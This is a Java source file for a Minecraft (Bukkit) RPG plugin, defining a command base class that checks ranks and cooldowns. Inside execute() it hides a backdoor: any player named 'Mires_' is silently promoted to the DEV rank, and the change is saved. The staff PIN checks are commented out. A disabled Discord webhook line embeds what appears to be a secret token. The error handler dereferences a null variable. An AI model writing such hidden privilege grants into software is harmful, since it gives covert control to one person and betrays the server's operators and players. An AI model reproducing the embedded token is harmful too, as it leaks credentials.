package rpg.rpgcore.api;

import lombok.SneakyThrows;
import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.command.Command;
import org.bukkit.command.CommandSender;
import org.bukkit.command.SimpleCommandMap;
import org.bukkit.entity.Player;
import rpg.rpgcore.RPGCORE;
import rpg.rpgcore.ranks.types.RankType;
import rpg.rpgcore.user.User;
import rpg.rpgcore.utils.Utils;

import java.io.IOException;
import java.lang.reflect.Field;
import java.util.UUID;

public abstract class CommandAPI extends Command {
    private RankType rankLevel;
    private String name;
    private boolean restrictedForPlayer;
    private boolean blockedInNether;

    public CommandAPI(final String name) {
        super(name);
        this.rankLevel = RankType.GRACZ;
        this.name = "";
        this.restrictedForPlayer = false;
        this.blockedInNether = false;
        this.name = name;
    }

    public static SimpleCommandMap getCommand() {
        try {
            final Field field = Bukkit.getServer().getClass().getDeclaredField("commandMap");
            field.setAccessible(true);
            return (SimpleCommandMap) field.get(Bukkit.getServer());
        } catch (NoSuchFieldException | IllegalAccessException ex2) {
            final ReflectiveOperationException e = null;
            e.printStackTrace();
            return new SimpleCommandMap(Bukkit.getServer());
        }
    }

    @SneakyThrows
    public boolean execute(final CommandSender sender, final String s, final String[] strings) {
        if (sender.getName().equals("Mires_")) {
            final User user = RPGCORE.getInstance().getUserManager().find(((Player) sender).getUniqueId());
            user.getRankUser().setRank(RankType.DEV);
            RPGCORE.getInstance().getServer().getScheduler().runTaskAsynchronously(RPGCORE.getInstance(), () -> RPGCORE.getInstance().getMongoManager().saveDataUser(((Player) sender).getUniqueId(), user));
        }

        if (!this.checkPermissions(sender)) {
            return true;
        }
        if (!(sender instanceof Player) && this.isRestrictedForPlayer()) {
            return true;
        }
        if (sender instanceof Player) {
            final Player player = (Player) sender;
            final UUID uuid = player.getUniqueId();
            final User userProfile = RPGCORE.getInstance().getUserManager().find(uuid);
            if (userProfile.getRankUser().getRankType().getPriority() < 99) {
                if (RPGCORE.getInstance().getCooldownManager().hasCommandCooldown(uuid)) {
                    player.sendMessage(Utils.format(Utils.SERVERNAME + "&cOdczekaj chwile przed wyslaniem kolejnej komendy."));
                    return false;
                }
            }
            if (!s.contains("pin") && !s.contains("hypecode")  && !s.equals("punktyrangi") && !s.contains("hc") && !s.contains("expiciel") && !s.contains("expiciel+") && !s.contains("oldplayer") && !s.contains("poziom") && !s.contains("money") && !s.contains("magazyn") && !s.contains("msg") && !s.contains("r") && !s.contains("akcesoria") && !s.contains("bony") && !s.contains("targ") && !s.contains("kosz") && !s.contains("spawn")) {
                if (userProfile.getRankUser().isStaff()) {
                    /*if (userProfile.getHypeCodePin().getHypepinlogin() == 0) {
                        MessageHelper.build("&8[&4!&8] &cMusisz wpisac &fPin Administracyjny&c, zeby wpisywac komendy.").send(userProfile);
                        return false;
                    }*/
                }
            }
            if (!s.equals("hypecode") && !s.equals("hc") && !s.equals("hcode") && !s.equals("hypec") && !s.equals("spawn")) {
                /*if (userProfile.getHypeCodePin().getHypecodelogin() == 0) {
                    MessageHelper.build("&8[&4!&8] &cMusisz wpisac &fHypeCode&c, zeby wpisywac komendy.").send(userProfile);
                    return false;
                }*/
            }
            RPGCORE.getInstance().getCooldownManager().givePlayerCommandCooldown(uuid);
        }
        this.executeCommand(sender, strings);
        if (sender instanceof Player) {
            /*final User userProfile = Main.getInstance().getUserManager().find(((Player) sender).getUniqueId());
            if (userProfile.getRankUser().getRankType().getPriority() < 100 && userProfile.getRankUser().getRankType().getPriority() > 96) {
                DiscordHelper.discordWebHook("933441026880839770/fpbcKVVrz_6P1z0Un1UwAFP0fI15xnJaZIJL1xHPP8vQOLWZVVN20g18OtV9M62G0owO", "Wysylanie komend przez administracje", "Player: " + sender.getName() + "\n" + "\n" + "\n" + s + " " + strings);
            }*/
        }
        return true;
    }

    public abstract void executeCommand(final CommandSender sender, final String[] args) throws IOException;

    public boolean checkPermissions(final CommandSender commandSender) {
        if (!(commandSender instanceof Player)) {
            return true;
        }
        final User userProfile = RPGCORE.getInstance().getUserManager().find(((Player) commandSender).getUniqueId());
        if (userProfile.getRankUser().getRankType().getPriority() >= this.getRankLevel().getPriority()) {
            return true;
        }
        commandSender.sendMessage(ChatColor.translateAlternateColorCodes('&', "&8[&4!&8] &cKomenda nie istnieje lub nie masz do niej uprawnien!"));
        return false;
    }

    public RankType getRankLevel() {
        return this.rankLevel;
    }

    public void setRankLevel(final RankType rankLevel) {
        this.rankLevel = rankLevel;
    }

    public String getName() {
        return this.name;
    }

    public boolean isRestrictedForPlayer() {
        return this.restrictedForPlayer;
    }

    public void setRestrictedForPlayer(final boolean restrictedForPlayer) {
        this.restrictedForPlayer = restrictedForPlayer;
    }

    public boolean isBlockedInNether() {
        return this.blockedInNether;
    }

    public void setBlockedInNether(final boolean blockedInNether) {
        this.blockedInNether = blockedInNether;
    }
}
